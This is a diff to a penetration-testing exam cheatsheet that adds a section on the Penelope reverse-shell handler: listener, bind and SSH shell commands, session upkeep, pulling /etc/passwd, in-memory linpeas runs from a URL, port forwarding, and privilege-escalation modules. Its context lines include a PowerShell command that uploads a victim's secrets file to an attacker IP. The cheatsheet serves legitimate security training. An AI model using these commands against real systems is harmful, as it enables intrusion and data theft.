@@ -115,6 +115,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
 - [Metasploit](#Metasploit)
 - [smbclient](#smbclient)
 - [updog](#updog)
+- [Penelope](#Penelope)
 - [WebDAV](#WebDAV)
 - [Burp Suite](#Burp-Suite)
 - [whatweb](#whatweb)
@@ -4001,6 +4002,78 @@ or
 $uri = "http://10.10.14.5:8000/upload"
 $filePath = "C:\Users\victim\Documents\secrets.txt"
 Invoke-WebRequest -Uri $uri -Method Post -InFile $filePath -ContentType "multipart/form-data"
+
+```
+## Penelope
+```
+# Start the listener
+penelope                                 # Listen default 0.0.0.0:4444
+penelope -p 5555                         # Listen to private port
+penelope -p 4444,5555                    # Listen to multiple ports at the same time
+penelope -i eth0 -p 5555                 # Listen on specific interface
+penelope -a                              # Listen + show sample reverse shell payloads
+
+# Bind shell / SSH reverse
+penelope -c target -p 3333               # Connect to bind shell
+penelope ssh user@target                 # Reverse shell via SSH (local port 4444)
+penelope -p 5555 ssh user@target         # Reverse shell via SSH, port custom
+
+# File server (share files/folders via HTTP, no need to build separate python http.server)
+penelope -s <File/Folder>
+penelope -s <File/Folder> -prefix /loot  # custom URL prefix
+
+===== Main Menu Commands =====
+
+# Session management 
+sessions                                 # List existing sessions
+interact <id> / i <id>                   # Attach to session (TAB completion, short cmd)
+upgrade                                  # Upgrade current shell to PTY
+maintain <N>                             # Automatically maintain N sessions/hosts, automatically respawn if dead
+# eg: maintain 2
+
+# File transfer (Penelope takes care of the underground serve/transfer, no need for curl/wget/python -m http.server)
+download /etc/passwd
+download /etc                            # Download the entire directory
+upload /home/user/payload.elf
+upload <local|URL>                       # Upload directly from URL
+
+# Run the script on RAM, without touching the target disk , output stream real-time to local
+script <local_script|URL>
+script https://raw.githubusercontent.com/.../linpeas.sh               
+
+# Open the downloaded file using the default local app
+open /var/www/html/config.php
+
+# Port forwarding
+portfwd host:port<-|->host:port>          # local & remote port forwarding
+
+# Open the downloaded file using the default local app
+open /var/www/html/config.php
+
+===== Session shortcut =====
+
+F12                     # Detach PTY shell -> return to Main Menu (can be changed via penelorc, eg Ctrl+P)
+Ctrl+C                  # Detach basic shell (when unable to upgrade PTY)
+Ctrl+D                  # Exit readline-upgraded shell (Windows target) to Main Menu
+Ctrl+L                  # Clear screen in Main Menu
+
+===== Useful Switch =====
+-L, --no-log            # Turn off session logging (avoid saving sensitive credentials to disk)
+-O, --oscp-safe         # Enable OSCP-safe mode, avoid using auto-priv-esc module
+-S, --single-session    # Keep only the first session created
+-ms, --max-sessions     # Limit the number of active sessions per host (default 5)
+-C, --no-attach         # Do not attach automatically when there is a new session (implicit acceptance, no interruption)
+-U, --no-upgrade        # Turn off PTY auto-upgrade (keep basic shell)
+-N, --no-bins           # Simulate missing binary on target to test fallback
+
+===== MCP integration =====
+penelope --mcp          # Enable MCP server (local HTTP, with bearer token)
+penelope --mcp-host 127.0.0.1 --mcp-port 9000 --mcp-token <token>
+
+===== System module =====
+run meterpreter         # Run meterpreter module (built-in)
+run traitor             # Upload Traitor to auto priv-esc (DO NOT use if -O/--oscp-safe)
+run peass_ng            # Run PEASS-NG module
 
 
 ```
